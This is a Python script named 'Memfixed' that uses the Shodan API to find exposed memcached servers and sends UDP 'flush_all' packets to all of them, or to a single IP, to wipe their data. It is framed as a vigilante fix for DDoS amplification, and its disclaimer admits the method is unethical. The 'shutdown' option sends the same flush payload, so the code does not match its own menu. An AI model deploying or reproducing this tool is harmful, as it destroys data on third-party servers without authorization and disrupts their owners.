#!/usr/bin/python
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager

starttime=time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        old_stdout = sys.stdout
        sys.stdout = devnull
        try:  
            yield
        finally:
            sys.stdout = old_stdout

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = color.HEADER + '''

  888b     d888 8888888888 888b     d888 8888888888 8888888 Y88b   d88P 8888888888 8888888b.  
  8888b   d8888 888        8888b   d8888 888          888    Y88b d88P  888        888  "Y88b 
  88888b.d88888 888        88888b.d88888 888          888     Y88o88P   888        888    888 
  888Y88888P888 8888888    888Y88888P888 8888888      888      Y888P    8888888    888    888 
  888 Y888P 888 888        888 Y888P 888 888          888      d888b    888        888    888 
  888  Y8P  888 888        888  Y8P  888 888          888     d88888b   888        888    888 
  888   "   888 888        888   "   888 888          888    d88P Y88b  888        888  .d88P 
  888       888 8888888888 888       888 888        8888888 d88P   Y88b 8888888888 8888888P"  
                                                                                            
                                        Author: @037

                              Credits to @dormando for killswitch

####################################### DISCLAIMER ###########################################
| Memfixed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable       |
| memcached servers. It then allows you to use the same servers to essentially "fix" or kill.|
| This method is unethical in every way looked at, but because vendors are not updating      |
| or to the least minimum disabling UDP, companies are being hit with amplified DDoS attacks.|
| Previously I had written a script for research purposes that allowed you to take advantage |
| of that flaw, this script undoes the other. This script will shutdown or flush all         |
| memcached servers within the list obtained from Shodan. Use responsibly.                   |
##############################################################################################
                                                                                            
'''
print(logo)

print('')
method = input('[*] Would you like to use this tool on ALL affected memcached servers or just ONE? <all/one>: ').lower()
if method.startswith('all'):
    jack = 1
if method.startswith('one'):
    ip = input('[*] Enter the IP address of the specific affected memcached server: ')
    jack = 0


if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readlines()
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[~] File written: ./api.txt')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        flush = '\x00\x00\x00\x00\x00\x01\x00\x00flush_all\r\n'
        shutdown = '\x00\x00\x00\x00\x00\x01\x00\x00flush_all\r\n'
        saveme = 'n'
        query = 'n'

        if jack == 1:
            myresults = Path("./servers.txt")
            query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
            if query.startswith('y'):
                print('')
                print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
                results = api.search('product:"Memcached" port:11211')
                print('[✓] API Key Authentication: SUCCESS')
                print('[~] Number of vulnerable servers: %s' % results['total'])
                print('')
                saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
                if saveresult.startswith('y'):
                    file2 = open('servers.txt', 'a')
                    for result in results['matches']:
                        file2.write(result['ip_str'] + "\n")
                    print('[~] File written: ./servers.txt')
                    print('')
                    file2.close()
            saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
            if myresults.is_file():
                if saveme.startswith('y'):
                    ip_arrayn = []
                    with open('servers.txt') as my_file:
                        for line in my_file:
                            ip_arrayn.append(line)
                    ip_array = [s.rstrip() for s in ip_arrayn]
            else:
                print('')
                print('[✘] Error: No servers stored locally, restarting!')
                print('')
        if saveme.startswith('y') or query.startswith('y') or method.startswith('one'):
            print('')
            print('===========================[METHODS]============================')
            print('|                                                              |')
            print('|        0x1: Shutdown all affected servers obtained           |')
            print('|        0x2: Flush mallicious data from all servers           |')
            print('|                                                              |')
            print('================================================================')
            print('')
            shutall = input('[*] Which method would you like to use against the affected server(s)? <1/2>: ')
            print('')
            if shutall == '1':
                if jack == 1:
                    if saveme.startswith('y'):
                        for i in ip_array:
                            print('[+] Sending shutdown sequence to: %s' % (i))
                            with suppress_stdout():
                                send(IP(dst='%s' % i) / UDP(dport=11211)/Raw(load=shutdown), count=1)
                        print('')
                        print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                        break
                    else:
                        for result in results['matches']:
                            print('[+] Sending shutdown sequence to: %s' % (result['ip_str']))
                            with suppress_stdout():
                                send(IP(dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=shutdown), count=1)
                        print('')
                        print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                        break
                else:
                    print('[+] Sending shutdown sequence to: %s' % (ip))
                    with suppress_stdout():
                        send(IP(dst='%s' % ip) / UDP(dport=11211)/Raw(load=shutdown), count=1)
                    print('')
                    print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                    break
            if shutall == '2':
                if jack == 1:
                    if saveme.startswith('y'):
                        for i in ip_array:
                            print('[+] Sending flush commands to: %s' % (i))
                            with suppress_stdout():
                                send(IP(dst='%s' % i) / UDP(dport=11211)/Raw(load=flush), count=10)
                        print('')
                        print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                        break
                    else:
                        for result in results['matches']:
                            print('[+] Sending flush commands to: %s' % (result['ip_str']))
                            with suppress_stdout():
                                send(IP(dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=flush), count=10)
                        print('')
                        print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                        break
                else:
                    print('[+] Sending flush commands to: %s' % (ip))
                    with suppress_stdout():
                        send(IP(dst='%s' % ip) / UDP(dport=11211)/Raw(load=flush), count=10)
                    print('')
                    print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                    break
            else:
                print('[✘] Error: No methods selected. Restarting platform!')


    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')
                file.close()
                print('[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('[•] Exiting Platform. Have a wonderful day.')
                break
